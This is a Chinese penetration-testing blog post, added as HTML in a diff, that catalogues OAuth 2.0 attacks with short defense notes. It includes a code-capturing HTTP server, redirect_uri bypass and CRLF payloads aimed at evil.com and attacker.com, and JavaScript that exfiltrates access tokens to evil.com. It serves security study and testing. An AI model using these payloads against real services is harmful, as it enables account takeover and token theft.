@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"congliang.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="引言OAuth 2.0 是当今 Web 和移动应用中最广泛使用的授权框架，Google、Facebook、GitHub 等平台均依赖它实现第三方登录与 API 授权。RFC 6749 将大量实现细节留给开发者自行决定，导致安全水平参差不齐。本文系统梳理 OAuth 2.0 常见攻击面，为渗透测试和安全评估提供参考。 免责声明： 本文技术仅供安全研究和授权测试使用，未经授权攻击他人系统属违法行为，作">
+<meta property="og:type" content="article">
+<meta property="og:title" content="OAuth 2.0攻击面">
+<meta property="og:url" content="https://congliang.github.io/OAuth-attacks/">
+<meta property="og:site_name" content="渗透测试实战记录">
+<meta property="og:description" content="引言OAuth 2.0 是当今 Web 和移动应用中最广泛使用的授权框架，Google、Facebook、GitHub 等平台均依赖它实现第三方登录与 API 授权。RFC 6749 将大量实现细节留给开发者自行决定，导致安全水平参差不齐。本文系统梳理 OAuth 2.0 常见攻击面，为渗透测试和安全评估提供参考。 免责声明： 本文技术仅供安全研究和授权测试使用，未经授权攻击他人系统属违法行为，作">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-08-01T00:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-04T15:34:45.941Z">
+<meta property="article:author" content="YunShang">
+<meta property="article:tag" content="Web安全">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="认证安全">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://congliang.github.io/OAuth-attacks/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://congliang.github.io/OAuth-attacks/","path":"OAuth-attacks/","title":"OAuth 2.0攻击面"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>OAuth 2.0攻击面 | 渗透测试实战记录</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">渗透测试实战记录</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">边学边记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%95%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">引言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#OAuth-2-0-%E6%8E%88%E6%9D%83%E7%A0%81%E6%A8%A1%E5%BC%8F%E6%B5%81%E7%A8%8B"><span class="nav-number">2.</span> <span class="nav-text">OAuth 2.0 授权码模式流程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E6%8E%88%E6%9D%83%E7%A0%81%E6%8B%A6%E6%88%AA-Authorization-Code-Interception"><span class="nav-number">3.</span> <span class="nav-text">一、授权码拦截 (Authorization Code Interception)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81redirect-uri-%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="nav-number">4.</span> <span class="nav-text">二、redirect_uri 绕过方法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-%E5%AD%90%E5%9F%9F%E4%B8%8E%E8%B7%AF%E5%BE%84%E7%BB%95%E8%BF%87"><span class="nav-number">4.1.</span> <span class="nav-text">2.1 子域与路径绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-%E6%AD%A3%E5%88%99%E8%96%84%E5%BC%B1%E7%82%B9"><span class="nav-number">4.2.</span> <span class="nav-text">2.2 正则薄弱点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93%E4%B8%8E-CRLF"><span class="nav-number">4.3.</span> <span class="nav-text">2.3 参数污染与 CRLF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-4-App-Scheme-%E5%8A%AB%E6%8C%81"><span class="nav-number">4.4.</span> <span class="nav-text">2.4 App Scheme 劫持</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-5-Localhost-%E5%8A%AB%E6%8C%81"><span class="nav-number">4.5.</span> <span class="nav-text">2.5 Localhost 劫持</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81State-%E5%8F%82%E6%95%B0-CSRF-%E6%94%BB%E5%87%BB"><span class="nav-number">5.</span> <span class="nav-text">三、State 参数 CSRF 攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81Scope-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-number">6.</span> <span class="nav-text">四、Scope 权限提升</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81%E9%9A%90%E5%BC%8F%E6%B5%81-Token-%E6%B3%84%E6%BC%8F"><span class="nav-number">7.</span> <span class="nav-text">五、隐式流 Token 泄漏</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD%E3%80%81PKCE-%E7%BB%95%E8%BF%87"><span class="nav-number">8.</span> <span class="nav-text">六、PKCE 绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#6-1-%E9%99%8D%E7%BA%A7%E6%94%BB%E5%87%BB"><span class="nav-number">8.1.</span> <span class="nav-text">6.1 降级攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-2-%E6%9C%AA%E5%BC%BA%E5%88%B6-PKCE"><span class="nav-number">8.2.</span> <span class="nav-text">6.2 未强制 PKCE</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%83%E3%80%81OAuth-OpenID-Connect-%E6%B7%B7%E5%90%88%E6%94%BB%E5%87%BB"><span class="nav-number">9.</span> <span class="nav-text">七、OAuth &#x2F; OpenID Connect 混合攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#7-1-%E6%B7%B7%E6%B7%86%E4%BB%A3%E7%90%86"><span class="nav-number">9.1.</span> <span class="nav-text">7.1 混淆代理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-2-ID-Token-%E8%AF%AF%E7%94%A8%E4%BD%9C-Access-Token"><span class="nav-number">9.2.</span> <span class="nav-text">7.2 ID Token 误用作 Access Token</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-3-Audience-%E7%BC%BA%E5%A4%B1"><span class="nav-number">9.3.</span> <span class="nav-text">7.3 Audience 缺失</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-4-Nonce-%E7%BC%BA%E5%A4%B1"><span class="nav-number">9.4.</span> <span class="nav-text">7.4 Nonce 缺失</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%BC%E5%90%88%E6%94%BB%E5%87%BB%E9%93%BE"><span class="nav-number">10.</span> <span class="nav-text">综合攻击链</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1%E6%B8%85%E5%8D%95"><span class="nav-number">11.</span> <span class="nav-text">防御清单</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E6%A3%80%E6%9F%A5%E8%A1%A8"><span class="nav-number">12.</span> <span class="nav-text">安全测试检查表</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%93%E8%AF%AD"><span class="nav-number">13.</span> <span class="nav-text">结语</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">YunShang</p>
+  <div class="site-description" itemprop="description">渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">127</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/congliang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;congliang" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yunshang0069@126.com" title="E-Mail → mailto:yunshang0069@126.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/OAuth-attacks/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="OAuth 2.0攻击面 | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          OAuth 2.0攻击面
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-08-01 08:00:00" itemprop="dateCreated datePublished" datetime="2026-08-01T08:00:00+08:00">2026-08-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:34:45" itemprop="dateModified" datetime="2026-06-04T23:34:45+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>OAuth 2.0 是当今 Web 和移动应用中最广泛使用的授权框架，Google、Facebook、GitHub 等平台均依赖它实现第三方登录与 API 授权。RFC 6749 将大量实现细节留给开发者自行决定，导致安全水平参差不齐。本文系统梳理 OAuth 2.0 常见攻击面，为渗透测试和安全评估提供参考。</p>
+<p><strong>免责声明：</strong> 本文技术仅供安全研究和授权测试使用，未经授权攻击他人系统属违法行为，作者不承担任何法律责任。</p>
+<hr>
+<h2 id="OAuth-2-0-授权码模式流程"><a href="#OAuth-2-0-授权码模式流程" class="headerlink" title="OAuth 2.0 授权码模式流程"></a>OAuth 2.0 授权码模式流程</h2><pre class="mermaid">sequenceDiagram
+    participant User as 用户
+    participant Client as 客户端
+    participant AuthServer as 授权服务器
+
+    User->>Client: 1. 发起登录
+    Client->>User: 2. 302 至授权端点
+    User->>AuthServer: 3. GET /authorize
+    AuthServer->>User: 4. 授权页面
+    User->>AuthServer: 5. 同意授权
+    AuthServer->>User: 6. 302 redirect_uri?code=xxx
+    User->>Client: 7. GET /callback?code=xxx
+    Client->>AuthServer: 8. POST /token
+    AuthServer->>Client: 9. access_token</pre>
+
+<hr>
+<h2 id="一、授权码拦截-Authorization-Code-Interception"><a href="#一、授权码拦截-Authorization-Code-Interception" class="headerlink" title="一、授权码拦截 (Authorization Code Interception)"></a>一、授权码拦截 (Authorization Code Interception)</h2><p>授权码通过 URL 参数 <code>?code=xxx</code> 回传，被截获即可在过期前换取 access_token。</p>
+<p><strong>常见场景：</strong> HTTP 明文传输、Referer 头泄漏（回调页加载第三方资源）、服务器日志泄漏、回调页面开放重定向。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> HTTPServer, BaseHTTPRequestHandler</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse, parse_qs</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Stealer</span>(<span class="title class_ inherited__">BaseHTTPRequestHandler</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_GET</span>(<span class="params">self</span>):</span><br><span class="line">        code = parse_qs(urlparse(<span class="variable language_">self</span>.path).query).get(<span class="string">&#x27;code&#x27;</span>, [<span class="literal">None</span>])[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> code:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;[+] 截获: <span class="subst">&#123;code&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.send_response(<span class="number">200</span>)</span><br><span class="line">        <span class="variable language_">self</span>.end_headers()</span><br><span class="line">HTTPServer((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">80</span>), Stealer).serve_forever()</span><br></pre></td></tr></table></figure>
+
+<p><strong>防御：</strong> 强制 HTTPS + HSTS，<code>Referrer-Policy: no-referrer</code>，授权码短过期且一次性使用。</p>
+<hr>
+<h2 id="二、redirect-uri-绕过方法"><a href="#二、redirect-uri-绕过方法" class="headerlink" title="二、redirect_uri 绕过方法"></a>二、redirect_uri 绕过方法</h2><p>redirect_uri 校验是 OAuth 安全核心防线。</p>
+<h3 id="2-1-子域与路径绕过"><a href="#2-1-子域与路径绕过" class="headerlink" title="2.1 子域与路径绕过"></a>2.1 子域与路径绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># *.example.com → 注册 attacker.example.com</span><br><span class="line">redirect_uri=https://legit.example.com/../../evil.com/callback</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-2-正则薄弱点"><a href="#2-2-正则薄弱点" class="headerlink" title="2.2 正则薄弱点"></a>2.2 正则薄弱点</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://legit.example.com.attacker.com/callback</span><br><span class="line">https://legit.example.com@attacker.com/callback</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-3-参数污染与-CRLF"><a href="#2-3-参数污染与-CRLF" class="headerlink" title="2.3 参数污染与 CRLF"></a>2.3 参数污染与 CRLF</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/authorize?redirect_uri=https://legit.com&amp;redirect_uri=https://evil.com</span><br><span class="line">redirect_uri=https://legit.com%0d%0aLocation:https://evil.com</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-4-App-Scheme-劫持"><a href="#2-4-App-Scheme-劫持" class="headerlink" title="2.4 App Scheme 劫持"></a>2.4 App Scheme 劫持</h3><p>移动端自定义 scheme（<code>myapp://callback</code>）可被恶意应用注册同名 scheme 劫持。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:scheme</span>=<span class="string">&quot;myapp&quot;</span> <span class="attr">android:host</span>=<span class="string">&quot;callback&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.VIEW&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.BROWSABLE&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-5-Localhost-劫持"><a href="#2-5-Localhost-劫持" class="headerlink" title="2.5 Localhost 劫持"></a>2.5 Localhost 劫持</h3><p><code>redirect_uri=http://localhost:任意端口/callback</code>，攻击者在受害者本机监听截获。</p>
+<hr>
+<h2 id="三、State-参数-CSRF-攻击"><a href="#三、State-参数-CSRF-攻击" class="headerlink" title="三、State 参数 CSRF 攻击"></a>三、State 参数 CSRF 攻击</h2><p><code>state</code> 绑定用户会话与授权请求，缺失或可预测则导致账户接管。</p>
+<ol>
+<li>攻击者完成 OAuth 获取 <code>code_attacker</code></li>
+<li>构造 <code>/callback?code=code_attacker&amp;state=attacker_state</code></li>
+<li>受害者点击后，攻击者第三方账户绑定至受害者账号</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">csrf_link = (</span><br><span class="line">    <span class="string">f&quot;https://victim-site.com/oauth/callback&quot;</span></span><br><span class="line">    <span class="string">f&quot;?code=<span class="subst">&#123;attacker_code&#125;</span>&amp;state=<span class="subst">&#123;attacker_state&#125;</span>&quot;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p><strong>防御：</strong> state 密码学安全随机生成，服务端严格校验，建议含 nonce 和签名。</p>
+<hr>
+<h2 id="四、Scope-权限提升"><a href="#四、Scope-权限提升" class="headerlink" title="四、Scope 权限提升"></a>四、Scope 权限提升</h2><p>服务端不校验 scope 时，攻击者获得超出预期权限。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># 正常: scope=read  →  攻击: scope=read+write+admin+delete</span><br></pre></td></tr></table></figure>
+
+<p><strong>Scope 递增：</strong> 首次 <code>scope=read</code>，再次 <code>scope=read+write+admin</code>，服务端仅检查已授权部分忽略新增项则提权。</p>
+<p><strong>Refresh Token 提权：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">resp = requests.post(<span class="string">&#x27;https://auth.example.com/token&#x27;</span>, data=&#123;</span><br><span class="line">    <span class="string">&#x27;grant_type&#x27;</span>: <span class="string">&#x27;refresh_token&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;refresh_token&#x27;</span>: <span class="string">&#x27;low_token&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;scope&#x27;</span>: <span class="string">&#x27;read write admin&#x27;</span>,  <span class="comment"># 提权尝试</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p><strong>防御：</strong> 服务端锁定 scope，拒绝客户端未授权扩增。</p>
+<hr>
+<h2 id="五、隐式流-Token-泄漏"><a href="#五、隐式流-Token-泄漏" class="headerlink" title="五、隐式流 Token 泄漏"></a>五、隐式流 Token 泄漏</h2><p>隐式流在 URL Fragment 返回 token：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://client.com/callback#access_token=xxx&amp;token_type=bearer</span><br></pre></td></tr></table></figure>
+
+<p>Fragment 不发服务器但仍有风险：恶意 JS 读 <code>window.location.hash</code>、postMessage 监听、浏览器扩展。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// postMessage 监听窃取</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;message&#x27;</span>, <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (e.<span class="property">data</span>?.<span class="property">access_token</span>) &#123;</span><br><span class="line">        <span class="title function_">fetch</span>(<span class="string">&#x27;https://evil.com/steal&#x27;</span>, &#123;</span><br><span class="line">            <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">            <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;<span class="attr">token</span>: e.<span class="property">data</span>.<span class="property">access_token</span>&#125;)</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// Fragment 外传</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Image</span>().<span class="property">src</span> = <span class="string">&#x27;https://evil.com/log?&#x27;</span> + <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">hash</span>;</span><br></pre></td></tr></table></figure>
+
+<p><strong>防御：</strong> 废弃隐式流，迁移至授权码 + PKCE。</p>
+<hr>
+<h2 id="六、PKCE-绕过"><a href="#六、PKCE-绕过" class="headerlink" title="六、PKCE 绕过"></a>六、PKCE 绕过</h2><p>PKCE (RFC 7636) 通过 <code>code_verifier</code> 和 <code>code_challenge</code> 防授权码拦截：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">verifier  = 随机字符串 (43-128 chars)</span><br><span class="line">challenge = BASE64URL(SHA256(verifier))</span><br><span class="line">授权: /authorize?code_challenge=xxx&amp;code_challenge_method=S256</span><br><span class="line">换 token: /token?code=xxx&amp;code_verifier=yyy → SHA256(yyy)==xxx ?</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-1-降级攻击"><a href="#6-1-降级攻击" class="headerlink" title="6.1 降级攻击"></a>6.1 降级攻击</h3><p>服务端允许 <code>plain</code> 时，攻击者用已知值换 token：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">known = <span class="string">&quot;aaaa...aaaa&quot;</span>  <span class="comment"># 43 字符</span></span><br><span class="line"><span class="comment"># code_challenge=known&amp;code_challenge_method=plain</span></span><br><span class="line"><span class="comment"># 截获 code 后直接用 known 换 token</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="6-2-未强制-PKCE"><a href="#6-2-未强制-PKCE" class="headerlink" title="6.2 未强制 PKCE"></a>6.2 未强制 PKCE</h3><p>部分提供方对机密客户端不强制 PKCE，截获授权码后可直接用 client_secret 换 token。</p>
+<p><strong>正确实现：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> secrets, hashlib, base64</span><br><span class="line"></span><br><span class="line">verifier = secrets.token_urlsafe(<span class="number">32</span>)</span><br><span class="line">challenge = base64.urlsafe_b64encode(</span><br><span class="line">    hashlib.sha256(verifier.encode()).digest()</span><br><span class="line">).rstrip(<span class="string">b&#x27;=&#x27;</span>).decode()</span><br><span class="line"><span class="comment"># 强制 S256，禁用 plain</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="七、OAuth-OpenID-Connect-混合攻击"><a href="#七、OAuth-OpenID-Connect-混合攻击" class="headerlink" title="七、OAuth &#x2F; OpenID Connect 混合攻击"></a>七、OAuth &#x2F; OpenID Connect 混合攻击</h2><h3 id="7-1-混淆代理"><a href="#7-1-混淆代理" class="headerlink" title="7.1 混淆代理"></a>7.1 混淆代理</h3><p>客户端接受任意 issuer 的 id_token，攻击者注册恶意 OIDC Provider，用其公钥签发伪造 token 冒充任意用户。</p>
